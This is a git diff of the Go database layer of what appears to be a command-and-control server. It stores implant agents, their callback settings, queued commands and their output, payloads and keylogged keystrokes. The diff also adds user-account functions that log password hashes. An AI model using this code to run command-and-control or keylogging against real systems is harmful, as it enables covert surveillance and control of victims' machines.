@@ -12,13 +12,6 @@ import (
 	_ "github.com/lib/pq"
 )
 
-type UserCreationRequest struct {
-    Username string `json:"username" binding:"required"`
-    Password string `json:"password" binding:"required"`
-    Role     string `json:"role" binding:"required"`
-}
-
-
 func goDotEnvVariable(key string) string {
 
 	// load .env file
@@ -31,7 +24,7 @@ func goDotEnvVariable(key string) string {
 	return os.Getenv(key)
 }
 
-func CreateAgent(db *sql.DB, uuid string, CallBackToIP string, CallBackFeq string, CallBackJitter string, Ip string, User string, Hostname string) {
+func CreateAgent(uuid string, CallBackToIP string, CallBackFeq string, CallBackJitter string, Ip string, User string, Hostname string) {
 	CreateAgentSQL := `INSERT INTO "Agents" ("UUID", "CallBackToIP", "CallBackFeq", "CallBackJitter", "Ip", "User", "Hostname")
 VALUES ($1, $2, $3, $4, $5, $6, $7)`
 
@@ -50,7 +43,7 @@ VALUES ($1, $2, $3, $4, $5, $6, $7)`
 	logger.Logf(logger.Info, "New Agent created in DB\n")
 }
 
-func CreateKeys(db *sql.DB, uuid string) {
+func CreateKeys(uuid string) {
 	CreateKeysSQL := `INSERT INTO "Keylog" ("UUID", "Keys")
 	VALUES ($1, $2)`
 
@@ -69,7 +62,7 @@ func CreateKeys(db *sql.DB, uuid string) {
 	logger.Logf(logger.Info, "New Keylog Agent created in DB\n")
 }
 
-func CreatePayload(db *sql.DB, uuid string, name string, description string, ServerIP string, ServerPort string, CallBackFeq string, CallBackJitter string, Concat string) {
+func CreatePayload(uuid string, name string, description string, ServerIP string, ServerPort string, CallBackFeq string, CallBackJitter string, Concat string) {
 	CreateAgentSQL := `INSERT INTO "Payloads" ("UUID", "Name", "Description", "ServerIP", "ServerPort", "CallbackFrequency", "CallbackJitter", "Concat")
 	VALUES ($1, $2, $3, $4, $5, $6, $7, $8)`
 
@@ -88,7 +81,7 @@ func CreatePayload(db *sql.DB, uuid string, name string, description string, Ser
 	logger.Logf(logger.Info, "New Payload created in DB\n")
 }
 
-func FetchOneAgent(db *sql.DB, uuid string) types.ConfigAgent {
+func FetchOneAgent(uuid string) types.ConfigAgent {
 	var info types.ConfigAgent
 	FetchSQL := `
 	SELECT 
@@ -122,7 +115,7 @@ func FetchOneAgent(db *sql.DB, uuid string) types.ConfigAgent {
 	return info
 }
 
-func FetchNextCommand(db *sql.DB, uuid string) types.GiveAgentCommand {
+func FetchNextCommand(uuid string) types.GiveAgentCommand {
 	var info types.GiveAgentCommand
 	FetchSQL := `
 	SELECT 
@@ -167,7 +160,7 @@ func FetchNextCommand(db *sql.DB, uuid string) types.GiveAgentCommand {
 	logger.Logf(logger.Info, "Agent %s Fetched Next Command %s \n", info.UpdateAgentConfig.Uuid, info.Command)
 	return info
 }
-func SendAgentCommand(db *sql.DB, uuid string, result string, CommandType string, Command string, CommandUUID string) {
+func SendAgentCommand(uuid string, result string, CommandType string, Command string, CommandUUID string) {
 	SendAgentCommandSQL := `INSERT INTO "Commands" ("UUID", "Result", "CommandType", "Command", "CommandUUID")
 	VALUES ($1, $2, $3, $4, $5)`
 
@@ -186,7 +179,7 @@ func SendAgentCommand(db *sql.DB, uuid string, result string, CommandType string
 	logger.Logf(logger.Info, "Agent %s Reveived New Command \n", uuid)
 }
 
-func UpdateAgentConfig(db *sql.DB, UUID string, CallbackServer string, CallbackFrequency string, CallbackJitter string) {
+func UpdateAgentConfig(UUID string, CallbackServer string, CallbackFrequency string, CallbackJitter string) {
 	updateAgentConfigSQL := `UPDATE "Agents" SET "CallBackToIP"= $1, "CallBackFeq"= $2, "CallBackJitter"= $3 WHERE "UUID"= $4`
 
 	statement, err := db.Prepare(updateAgentConfigSQL)
@@ -204,7 +197,7 @@ func UpdateAgentConfig(db *sql.DB, UUID string, CallbackServer string, CallbackF
 	logger.Logf(logger.Info, "Agent %s Reveived Config Update  \n", UUID)
 }
 
-func UpdateAgentCheckIn(db *sql.DB, UUID string, LastCallBack int64) {
+func UpdateAgentCheckIn(UUID string, LastCallBack int64) {
 	updateAgentCheckInSQL := `UPDATE "Agents" SET "LastCallBack"= $1 WHERE "UUID"= $2`
 
 	statement, err := db.Prepare(updateAgentCheckInSQL)
@@ -222,7 +215,7 @@ func UpdateAgentCheckIn(db *sql.DB, UUID string, LastCallBack int64) {
 	logger.Logf(logger.Done, "Agent %s Check in Update  \n", UUID)
 }
 
-func UpdateAgentStatus(db *sql.DB) {
+func UpdateAgentStatus() {
 	updateAgentStatusSQL := `UPDATE "Agents"
 	SET "Status" = CASE WHEN (EXTRACT(EPOCH FROM CURRENT_TIMESTAMP)  - "LastCallBack" > (2 * ("CallBackFeq"::numeric)))
 		THEN 'Offline' ELSE 'Online' END
@@ -243,7 +236,7 @@ func UpdateAgentStatus(db *sql.DB) {
 	logger.Logf(logger.Info, "Agent Status Updated\n")
 }
 
-func UpdateAgentCommand(db *sql.DB, CommandUUID string, Output string, uuid string) {
+func UpdateAgentCommand(CommandUUID string, Output string, uuid string) {
 	updateAgentCommandSQL := `UPDATE "Commands" SET "Result"='1', "Output"= $1 WHERE "CommandUUID"= $2`
 
 	statement, err := db.Prepare(updateAgentCommandSQL)
@@ -261,7 +254,7 @@ func UpdateAgentCommand(db *sql.DB, CommandUUID string, Output string, uuid stri
 	logger.Logf(logger.Info, "Agent %s Reveived Output with CommandID %s \n", uuid, CommandUUID)
 }
 
-func UpdateAgentKeys(db *sql.DB, UUID string, Keys string) {
+func UpdateAgentKeys(UUID string, Keys string) {
 	updateAgentKeylogSQL := `UPDATE "Keylog" SET "Keys"="Keys" || $1 WHERE "UUID"= $2`
 
 	statement, err := db.Prepare(updateAgentKeylogSQL)
@@ -278,7 +271,7 @@ func UpdateAgentKeys(db *sql.DB, UUID string, Keys string) {
 	}
 }
 
-func DeleteAgent(db *sql.DB, UUID string) {
+func DeleteAgent(UUID string) {
 	DeleteAgentSQL := `UPDATE "Agents" SET "isDeleted"=1 WHERE "UUID"= $1`
 
 	statement, err := db.Prepare(DeleteAgentSQL)
@@ -297,7 +290,7 @@ func DeleteAgent(db *sql.DB, UUID string) {
 
 // WEB Functions
 
-func Agents(db *sql.DB) []types.ConfigAgent {
+func Agents() (agentAppend []types.ConfigAgent, err error) {
 	var agents types.ConfigAgent
 	FetchSQL := `
 	SELECT 
@@ -317,7 +310,6 @@ func Agents(db *sql.DB) []types.ConfigAgent {
 		log.Fatal(err)
 	}
 	defer row.Close()
-	var agentAppend []types.ConfigAgent
 	for row.Next() {
 		row.Scan(
 			&agents.Uuid,
@@ -331,10 +323,10 @@ func Agents(db *sql.DB) []types.ConfigAgent {
 		)
 		agentAppend = append(agentAppend, agents)
 	}
-	return agentAppend
+	return agentAppend, err
 }
 
-func AgentsByIp(db *sql.DB, Ip string) []types.ConfigAgent {
+func AgentsByIp(Ip string) []types.ConfigAgent {
 	var agents types.ConfigAgent
 	FetchSQL := `
 	SELECT 
@@ -372,7 +364,7 @@ func AgentsByIp(db *sql.DB, Ip string) []types.ConfigAgent {
 	return agentAppend
 }
 
-func GroupAgentsByIp(db *sql.DB) []types.AgentIP {
+func GroupAgentsByIp() []types.AgentIP {
 	var agents types.AgentIP
 	FetchSQL := `
 	SELECT DISTINCT "Ip" FROM "Agents"
@@ -392,7 +384,7 @@ func GroupAgentsByIp(db *sql.DB) []types.AgentIP {
 	return agentAppend
 }
 
-func Payloads(db *sql.DB) []types.Payload {
+func Payloads() []types.Payload {
 	var payloads types.Payload
 	FetchSQL := `
 	SELECT 
@@ -429,7 +421,7 @@ func Payloads(db *sql.DB) []types.Payload {
 	return payloadAppend
 }
 
-func Agent(db *sql.DB, uuid string) []types.Agent {
+func Agent(uuid string) []types.Agent {
 	var info types.Agent
 	FetchSQL := `
 	SELECT 
@@ -460,7 +452,7 @@ func Agent(db *sql.DB, uuid string) []types.Agent {
 	return infoAppend
 }
 
-func Keylog(db *sql.DB, uuid string) []types.KeyReceive {
+func Keylog(uuid string) []types.KeyReceive {
 	var info types.KeyReceive
 	FetchSQL := `
 	SELECT 
@@ -486,7 +478,7 @@ func Keylog(db *sql.DB, uuid string) []types.KeyReceive {
 	return infoAppend
 }
 
-func FetchOne(db *sql.DB, uuid string) []types.ConfigAgent {
+func FetchOne(uuid string) []types.ConfigAgent {
 	var info types.ConfigAgent
 	FetchSQL := `
 	SELECT 
@@ -539,4 +531,29 @@ func DeleteUserByID(userID int) error {
     }
 
     return nil
+}
+
+func getUserByUsername(username string) (*User, error) {
+    var user User
+    err := db.Get(&user, "SELECT * FROM users WHERE username=$1", username)
+    return &user, err
+}
+
+func createUser(user *User) error {
+    CreateUserSQL := `
+	INSERT INTO users (username, password_hash, role)
+	VALUES ($1, $2, $3)
+	ON CONFLICT (username) DO NOTHING;
+	`
+
+    logger.Logf(logger.Info, "Username %v\n", user.Username)
+    logger.Logf(logger.Info, "User password hash %v\n", user.PasswordHash)
+    logger.Logf(logger.Info, "User role %v\n", user.Role)
+    _, err := db.Exec(CreateUserSQL, user.Username, user.PasswordHash, user.Role)
+    if err != nil {
+        logger.Logf(logger.Error, "Failed to create user: %v\n", err)
+    }
+    logger.Logf(logger.Info, "User %v created\n", user.Username)
+	return err
+
 }
